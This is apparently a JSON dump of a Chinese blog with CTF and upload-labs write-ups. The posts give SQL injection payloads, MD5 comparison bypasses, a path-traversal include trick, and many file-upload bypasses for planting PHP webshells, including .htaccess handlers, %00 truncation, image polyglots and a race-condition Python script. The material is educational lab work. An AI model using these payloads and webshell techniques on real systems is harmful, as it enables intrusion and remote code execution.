[{"title":"SWPUCTF2021新生赛_ez_unserialize","date":"2022-04-19T02:35:56.000Z","path":"2022/04/19/SWPUCTF2021新生赛-ez-unserialize/","text":"#SWPUCTF2021新生赛_ez_unserialize# （1）题目 &lt;?php error_reporting(0); show_source(&quot;cl45s.php&quot;); class wllm&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;user&quot;; $this-&gt;passwd = &quot;123456&quot;; &#125; public function __destruct()&#123; if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123; include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &quot;Just a bit more!&quot;; &#125; &#125; &#125; $p = $_GET[&#39;p&#39;]; unserialize($p); ?&gt; php类的相关知识点： https://www.runoob.com/php/php-oop.html （2）这道题主要是要通过对p传值来对passwd经行修改，其中传值要通过序列化传值。 &lt;?php class wllm&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;admin&quot;; $this-&gt;passwd = &quot;ctf&quot;; &#125; &#125; $p= new wllm(); echo serialize($p); ?&gt; //输出 O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:4:&quot;user&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125; 构造payload：?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;} （3）爆出flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"强网杯2019_随便注","date":"2022-03-17T13:01:39.000Z","path":"2022/03/17/强网杯2019-随便注/","text":"强网杯2019_随便注（1）打开页面，先试几个关键词，发现很多关键字被过滤掉了 （2）既然select被过滤掉了，便尝试一下堆叠注入。 好像可以，再试试。 1919810931114514必须用反单引号括起来，但是words不需要，应该是和数据类型有关。 （3）方法 法一： （1）仔细观察，发现查询框里值1的返回值为两个数据，表words中正好存储了两列数据，而1919810931114514表中仅有flag这列数据。据此，我们不妨猜测查询框所查询的值为words表中的值。 查询框后台的语句为：select id,data from words where id= （2）既然查询框是从words表中查询数据，那么我们就可以通过把1919810931114514改为words表，把属性名flag改为id，来查询flag。 （3）改名 1&#39;;rename table `words` to words2; rename table `1919810931114514` to `words`; alter table words change flag id varchar(100); 由于flag更改成id后，里面的值只有flag，我们可以构造1’ or 1=1;永真式来查询flag； 法二： （1）因为select被过滤了，所以先将select * from 1919810931114514进行16进制编码，再通过构造payload得flag。 注：在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。 预处理语句的SQL语法基于三个SQL语句:（详情可以参考博主《sql注入——预处理语句》这篇博客） 1.PREPARE语句准备执行。 2.EXECUTE执行一条预处理语句。 3.DEALLOCATE PREPARE释放一个预处理语句。 （2）构造payload 1&#39;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from `1919810931114514`&quot;);PRepare hello from @a;execute hello;# 这里set和prepare都被过滤了，不过过滤使用的函数strstr是区分大小写的我们可以通过大小写绕过。 （3）爆出flag。 法三： （1）这里由于没有过滤handler语句，我们可以通过handler语句来进行查询。 （2）构造payload 1&#39;;handler `1919810931114514` open as `a`;handler `a` read next; （3）爆出flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"BJDCTF2020_Easy_MD5","date":"2022-03-14T11:58:42.000Z","path":"2022/03/14/BJDCTF2020-Easy-MD5/","text":"BUU-BJDCTF2020_Easy_MD5（1）前言 博主今天来刷一刷之前从未碰过的md5题型。 本题的主要知识点是： a.password=md5($pass,true)绕过 b.MD5的弱碰撞 c.md5强比较 （2）打开界面，在窗口随便传点值 首先我们发现了地址栏处出现了get传值 leveldo4.php?password=123 打开bp看一看，我们发现了一行hint（暗示） 这里我去参考了一些师傅的wp，得到了几个万能钥匙。 ffifdyop 由于ffifdyop对应的16位原始二进制的字符串就是’or’6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c ，这个字符串前几位刚好是’ or ‘6。 select * from &#39;admin&#39; where password = &#39; &#39; or &#39;6....&#39; （3）转跳到下一步，bp抓包一下观察到 &lt;!-- $a = $GET[&#39;a&#39;]; $b = $_GET[&#39;b&#39;]; if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend. 这是一个MD5的弱类型比较 令a与b的值不相同，md5的值相同 网上找了些md5值相同的数（由于这些数MD5的值为0e，在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。） QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 payload：?a=s1885207154a&amp;b=0e509367213418206700842008763514 （4）转跳到另一个新的页面 &lt;?php error_reporting(0); include &quot;flag.php&quot;; highlight_file(__FILE__); if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))&#123; echo $flag; &#125; 这里是===强比较，因为md5解析不了数组我们可以构造数组绕过 payload：param1[]=1&amp;param2[]=2 爆出flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"php数组不为连续数问题","date":"2022-03-11T14:05:18.000Z","path":"2022/03/11/php数组不为连续数问题/","text":"php数组下标不为连续数问题（1）前言 这个问题是博主在刷upload靶场时遇到的。 （2）问题描述 这里博主分别定义了a[0]与a[2]并赋值，然后计算a这个数组共有多少的元素并打印，同时打印a[2]; 如果a为数组，又因为a[1]并没有进行赋值，则按理来说会自动赋予空字符。因此用count函数去计算a数组的元素返回值应为3，但却返回了2。 （3）问题的解决 这可能是博主php的代码不过关。遇到了这个问题博主立刻去恶补了一下php数组的知识，了解到了一下特性。 php数组特点（以下内容参考黑马程序员的相关教程） （1）可以整数下标或者字符串下标 如果数组下标都为整数：索引数组 如果数组下标都为字符串：关联数组 （2）不同下标可以混合存在：混合数组 （3）数组元素的顺序以放入顺序为准，跟下标无关 （4）数字下标的自增长特性：从0开始自动增长，如果中间手动出现较大的，那么后面的自增长元素从最大的值+1开始 （5）特殊值下标自动转换 （7）php数组元素没有类型限制 （8）php数组元素没有长度限制 （9）php中的数组是很大的数据，所以存储的位置是堆区，为当前数组分配一块连续的内存。","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"upload_labs","date":"2022-03-03T12:32:40.000Z","path":"2022/03/03/upload-labs/","text":"upload_labs前言：博主之前因为一些其它的事一直拖拉，终于在这几天把这个靶场完成了。 博主建议过这关靶场时最好自己搭建环境，对于操作和改靶场的bug比较方便。 靶场链接：https://github.com/c0ny1/upload-labs（bug有点小多，一些需要自己去修改） 博主是在windows+apache2.4的环境搭建的。（建议用windows搭建） pass1（1）打开页面 js（JavaScript）检查属于前端验证，在浏览器未提交数据时进行验证。我们可以利用Burp suite来拦截请求，通过修改请求来绕过前端的JavaScript验证，并成功地向服务器提交了数据。 前端JavaScript验证是为了防止用户输入错误，服务器端验证是为了防止恶意攻击。 （2）先用png文件格式绕过js验证，用bp抓包、改包，改为php绕过。 （3）用蚁剑链接 pass2（1）提示 （2）上传php文件，bp抓包，写码，修改数据包的MIME if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) 由码源知道需要以上的格式。 （3）用蚁剑链接 pass3（1）提示 $deny_ext = array(‘.asp’,’.aspx’,’.php’,’.jsp’); 后缀过滤不严，我们只需要把.php后缀修改为.phtml即可 （2）bp抓包修改 （3）蚁剑连接 pass4（1）提示 这很明显没有对文件后缀名进行详细的过滤。 （2）利用.htaccess文件修改png文件的后缀 //.htaccess文件内容 &lt;FilesMatch &quot;1.png&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 注：要对apache进行配置，一般的apache关闭了.htaccess文件的使用。 （3）先上传.htaccess文件，在上传带一句话木马的png文件，便会被当作php文件解析 （4）蚁剑连接 注：这里还可以使用开发者工具来查看图片上传的地址 pass5（1）提示 $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 由于php代码是按由上倒下的顺序执行的，并且deldot、trim函数只执行一次操作。于是我们可以把.php改为.php. .进行绕过。 （2）bp抓包，改后缀 （3）蚁剑连接 pass6（1）提示 $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 （2）没有进行大小写过滤 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！ 把.php改为.Php绕过。 （3）用蚁剑连接 pass7（1）提示 $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA 没有过滤到文件末尾的空格，我们可以利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php （末尾有一个空格） （2）bp抓包，修改后缀 （3）蚁剑连接 pass8（1）提示 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 少了去“.”，同样我们可以利用Windows系统的文件名特性。文件名后缀改成php . （2）bp抓包，修改后缀 （3）蚁剑连接 pass9（1）提示 $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 少了去字符串::$DATA，我们可以利用Windows系统的文件名特性。在windows中，会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名，起到绕过后端检测的效果。 （2）bp抓包，修改后缀 （3）蚁剑连接 由于在windows中只会保持::$DATA之前的文件名，所以用蚁剑连接时，要去掉::$DATA pass10（1）提示 $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 …… $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; 与前面几关一样，我们可以利用Windows系统的文件名特性。原文件改成php. .绕过 （2）bp抓包，修改后缀 （3）蚁剑连接 pass11（1）提示 既然会去除后缀，那我们不妨尝试一下双写的技巧。把后缀改成.pphphp （2）bp抓包，修改后缀 （3）蚁剑连接 pass12（1）提示 $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; 分析代码，这是以时间戳的方式对上传文件进行命名，使用上传路径名%00截断绕过，不过这需要对文件有足够的权限，比如说创建文件夹，上传的文件名写成1.jpg, save_path改成…/upload/1.php%00，最后保存下来的文件就是1.php url中，%00对应的ascii码值为0，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片 （2）bp抓包修改 （3）蚁剑连接 当url中出现%00时就会认为读取已结束，所以连接蚁剑时，会自己保存%00以前的内容 ps.php版本要小于5.3.4，magic_quotes_gpc需要为Off状态。可在php的配置文件中修改。pass13 (1)提示 原理与前一关一样，区别在于前一关采用的是get的方式，这一关用的是post的方式，我们同样可以在bp的hex拦中进行修改。我们在Hex中找到对应的十六进制码（php的十六进制码为70 68 70），因此我们将在这串编码后的值更改为00。 （2）bp抓包修改 先把php文件的后缀改为jpg，upload后加上1.php使文件被解析成php文件 然后修改hex的值 （3）蚁剑连接 pass14（1）提示 function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); //把这两字节分别放入数组&quot;C2chars&quot; $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); //将字节转化为二进制流 $fileType = &#39;&#39;; switch($typeCode)&#123; case 255216: $fileType = &#39;jpg&#39;; break; case 13780: $fileType = &#39;png&#39;; break; case 7173: $fileType = &#39;gif&#39;; break; default: $fileType = &#39;unknown&#39;; &#125; return $fileType; &#125; 源码通过二进制的方式查看文件前2字节(文件头)是否为合法文件。 一般而言jpg、png、gif这类格图片格式的前几个字符（16进制下）都是一样的，有些防护手段也是通过这种特征码来判断的。所以我们可以通过构造图片码绕过。 注：图片码的制作 a.先将准备好的图片与php代码放入同一文件夹 b.打开cmd，cd到指定文件夹 c.执行cmd指令: copy 1.jpg /b + 1.php /a 2.jpg 注：识别图片格式的方法https://www.jb51.net/article/205800.htm （2）制作图片码上传 因为蚁剑连接不了图片，所以我们用phpinfo这个命令来判断我们成功渗透。 （3）利用文件包含漏洞，触发图片码 这里博主搭建的靶场是有漏洞的，upload文件夹里的文件包含漏洞文件会被删除，博主也懒得去找原因，直接复制根目录的文件包含漏洞的文件到upload文件中。 pass15（1）提示 function isImage($filename)&#123; $types = &#39;.jpeg|.png|.gif&#39;; if(file_exists($filename))&#123; $info = getimagesize($filename);//获取图片大小，返回的结果是数组 $ext = image_type_to_extension($info[2]);//取得图像类型的文件后缀 if(stripos($types,$ext)&gt;=0)&#123; //查找字符串首次出现的位置 return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125; &#125; （2）与上一关的方法相同，上传图片码绕过 pass16（1）提示 function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename);//通过exif_imagetype函数检测是否图片格式正确 switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125; &#125; （2）也同样与14关方法相同，上传图片码 pass17（1）提示 else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else&#123; $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125; &#125; 这一关主要考的是二次渲染，我们可以利用gif文件的特性，gif文件在二次渲染之后会保留一段和渲染前相同的内容，而jpg与png则没有这段内容。 （2）我们先制作gif的图片码，上传，在把上传后的图片下载下来，用010editor比较不同由于博主之前就把码注入到不变的位置，所以渲染后的图片，仍保存这一段代码。 （3）利用文件包含，触发图片码 pass18（1）提示 if(move_uploaded_file($temp_file, $upload_file))&#123; //move_uploaded_file() 函数把上传的文件移动到新位置。 if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#39;上传出错！&#39;; &#125; 本关先通过move_uploaded_file（）移动文件到指定的位置，再对文件后缀进行检查。合法，就重命名；不合法，就用unlink函数删掉。也就是说只要我们在move_uploaded_file（）移动文件后，经行后缀判断前，读取文件，注入webshell就可以了。 （2）bp不停发送文件。 上传文件创建新后门的文件 &lt;?php ?&gt;&#39;);?&gt; fputs — fwrite() 的别名 fwrite — 写入文件，这里的意思是把’‘的内容写入1.php这个文件中，由于upload文件中不存在1.php这个文件利用了fopen这个函数，来创建1.php这个文件。 fopen() - 打开文件或者 URL，将 filename 指定的名字，资源绑定到一个流上。 fopen( string $filename, string $mode, bool $use_include_path = false, resource $context = ?) : resource ‘w’ 写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。 注：执行这些函数要有文件的读写权限 （3）用python脚本不断读取文件实现通过这样的条件竞争来实现注入 利用python程序中的request模块，不断访问第一次发送的文件，使之创造出新的后门文件。如果成功访问新建的后门文件，则代码执行成功。 # python脚本 import requests url_1 = &quot; http://192.168.3.243:81/upload/include.php?file=2.jpg &quot; url_2 = &quot; http://192.168.3.243:81/upload/1.php &quot; while True: html_1 = requests.get(url_1) html_2 = requests.get(url_2) if html_1.status_code == 200: print(&quot;1&quot;) if html_2.status_code == 200: print(&quot;YES&quot;) break else: print(&quot;NO&quot;) （4）实际操作 出现了yes就代表成功了。 （5）接下来就直接用蚁剑去连接 pass19等待更新 pass20（1）提示 $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#39;save_name&#39;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; pathinfo( string $path, int $flags = PATHINFO_ALL) : array|string pathinfo() 返回一个关联数组包含有 path 的信息。返回关联数组还是字符串取决于 flags。 flag: PATHINFO_DIRNAME - 只返回 dirname PATHINFO_BASENAME - 只返回 basename PATHINFO_EXTENSION - 只返回 extension PATHINFO_FILENAME - 只返回 filename pathinfo() 纯粹基于输入字符串操作，它不会受实际文件系统和类似 “..” 的路径格式影响。 我们可以利用这点，把.php的后缀改成”.php. ”，这样返回的后缀就会绕过后缀检查，而多出来的”. “，就会被windows系统的文件名特性忽略掉，从而成功上传文件。 （2）修改保存的名称 （3）用蚁剑连接 pass21（1）提示 if(!empty($_FILES[&#39;upload_file&#39;]))&#123; //检查MIME $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;); if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名，检查&#39;save_name&#39;的值是否为空，如果为空则flie的值为上传文件的名字，否则为&#39;save_name&#39;的值。 $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;]; if (!is_array($file)) &#123; //如果file的值不是数组，使用explode函数用“.”分割$file的值为两部分，其返回值是数组。 //strtolower函数则是使file的值转化为小写。 $file = explode(&#39;.&#39;, strtolower($file)); &#125; $ext = end($file); //end()取file数组的最后一行 $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; //reset函数是使指向$file的指针，重返初始位置，并返回第一个的值 //count — 计算数组中的单元数目 $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1]; //$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称 $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; …… 首先要绕过MIME的检查，这个我们通过bp抓包修改Content-Type:的值就可以了。然后savename的值如果不是数组则会被拆为数组，那不妨我们直接构造一个数组传给file。 同时我们可以利用php数组下标不不为连续数问题（可详细参考博主的下一篇博客） 传入： save_name[0]=1.php save_name[2]=jpg 这样save_name[2]=jpg用于绕过后缀检查，而count函数计算出来的值为2，所以$file[count($file) - 1]也就是$file[1]的返回值为空，最后$img_path的值也就为1.php.，在通过windows的文件名特性会忽略掉最后的“.”，就成功上传了 （2）用蚁剑连接","tags":[{"name":"靶场","slug":"靶场","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"[SUCTF 2019]EasySQL","date":"2022-02-23T12:03:01.000Z","path":"2022/02/23/[SUCTF 2019]EasySQL/","text":"[SUCTF 2019]EasySQL要点： a.堆叠注入。 b.||在oracle和mysql数据库功能的联想，sql_mode=pipes_as_concat的使用。 c.猜测后端语句。（较难） （1）打开靶场，简单测试一下 payload 1 页面正常回显 1&#39; 页面无回显 1&#39; or 1=1 回显nonono（猜测可能被过滤掉了一些东西） （2）用fuzz字典扫一下 好家伙，好多关键词被过滤了。 注：这里博主的字典不全漏了union（后面手工注入才发现） 用不了union联合查询注入，where关键词也被过滤了，只剩下堆叠注入可以尝试一下； （3）尝试一下堆叠注入 好像还真可以 1；show databases; 1; show tables; 我去，到了列这里出了问题。 试了一下，from和Flag都被过滤掉了；试了一些方法绕不过去； （4）没办法，去找了一下大佬的wp 据大佬给出的wp，他给出的解释是想让做题的人去猜测后端语句。 通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有||，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)，需要注意的是，此时的||起到的作用是or的作用。 （5）解法 解法1：既然select post进去的数据||flag from Flag，那不妨通过修改SQL配置将或运算符||设置为连接符。 结合堆叠注入，构造payload（oracle 支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 不支持。mysql可以通过更改sql_mode=pipes_as_concat来使 || 用作拼接的作用。） 1;set sql_mode=PIPES_AS_CONCAT;select 1 得到flag 解法2： 大佬给的另一种解法 如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容 payload *,1 这里也是利用了||的或功能，1||flag的返回值是1；","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"[GXYCTF2019]BabyUpload","date":"2022-02-22T11:42:49.000Z","path":"2022/02/22/GXYCTF2019_BabyUpload/","text":"[GXYCTF2019]BabyUpload（1）先随便上传png文件看看 好像不行 （2）抓包，写一句话木马，不断改后缀，直到jpeg好像传上去了。 （3）后缀改成php看看ph的后缀好像都不行 （4）这时候就要用.htaccess文件把后缀直接更改成php文件 （5）抓包改Content-Type:image/jpeg绕过filename后缀不要动！只要改改Content-Type:image/jpeg就可以。 博主设置的.htaccess文件是把带png后缀的文件改为php文件，博主之前也把filename后缀改为jpeg以致一直连接不上蚁剑。 （6）最后用蚁剑连接，再根目录下找到flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"sql注入--堆叠注入","date":"2022-02-22T08:56:50.000Z","path":"2022/02/22/sql注入-堆叠注入/","text":"sql注入–堆叠注入（1）原理Stacked injection 汉语翻译过来后，国内有的称为堆查询注入，也有称之为堆叠注入。在SQL中，分号（;）是用来表示一条sql语句的结束。结束一个sql语句后继续执行分号后面的下一条语句。 堆叠注入的作用是同时执行多条任意语句，而union联合注入合并执行的语句有限，可以用来执行查询语句。 （2）堆叠注入的局限性堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 注：Mysql、Sql server、Postgresql可执行堆叠注入，Oracle不行。","tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"[HCTF 2018]WarmUp","date":"2022-02-11T12:31:07.000Z","path":"2022/02/11/[HCTF 2018]WarmUp/","text":"[HCTF 2018]WarmUp（1）开局一张滑稽脸。 （2）查看源代码，得到提示 （3）打开提示页面，又获得一个提示页面 （4）看看另外一个提示的页面提示了flag在ffffllllaaaagggg （5）回到sourch.php页面简单解读一下源码 &lt;?php highlight_file(__FILE__);//highlight_file()函数输出一个突出显示PHP语法的文件。（打印以下代码） class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];//定义一个白名单 if (! isset($page) || !is_string($page)) &#123; //判断$page是否不为空或是否不是字符串，是则返回false和打印&quot;you can&#39;t see it&quot;。 echo &quot;you can&#39;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; //从$whitelist中查找是否有$page有则返回true return true; &#125; $_page = mb_substr( //截取参数中的?之前的一部分，如果没有?则，截取所有参数。 $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) //$page . &#39;?&#39;是指$page的值与？拼接在一起 ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page);//定义$_page的值为$page的url解码（说实话这步解码觉得没啥意义） $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#39;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#39;file&#39;])//要求传入的 file变量的值需要满足：非空，字符串，能通过 checkFile()函数 &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) &#123; include $_REQUEST[&#39;file&#39;]; //包含$_REQUEST[&#39;file&#39;]文件 exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; //打印滑稽表情 ?&gt; 即要给参数file传值，要求传入的 file变量的值需要满足：非空，字符串，能通过 checkFile()函数。 （6）构造file的值 a.符合whitelist里面的值file=hint.php/source.php（两个都可以） b.第一个判断$page是否在$whitelist数组中，无论有没有并不会影响file通过 checkFile()函数，所以可以忽略不计。 c.看到include 和上面的checkfile我们就很敏感的得知是利用include。我们知道如果直接放入hint.php？ffffllllaaaaggg会通过checkFile的验证返回true，但是毫无疑问这种错误的文件名是无法被include正确读取的，所以正确为hint.php?/ffffllllaaaagggg。 d.截取$page中’?’前一部分判断是否$whitelist数组中 ，判断url解码并截取了’?’前一部分的$page是否存在于$whitelist中；(‘?’url解码后还是’?’,影响不大) e.初步猜测为 ?file=hint.php？/ffffllllaaaagggg f.经过测试发现无返回值，这可能是因为我们不知道ffffllllaaaagggg文件存放的具体位置,所以依次增加../（不断返回上一级目录）,最终成功拿到flag。","tags":[{"name":"题目","slug":"题目","permalink":"http://example.com/tags/%E9%A2%98%E7%9B%AE/"}]},{"title":"[ACTF2020 新生赛]Upload1","date":"2022-02-10T14:56:18.000Z","path":"2022/02/10/新生赛-Upload1/","text":"[ACTF2020 新生赛]Upload1（1）很明显文件上传题 （2）上传文件 先随便传个jpg文件看看 （3）用burp suite抓包，写一句话木马，改后缀名加入较为常见的一句话木马：改jpg的后缀（常见的后缀有php、php3、php4、php5、php7、pht、phtml、phps），尝试到phtml成功。 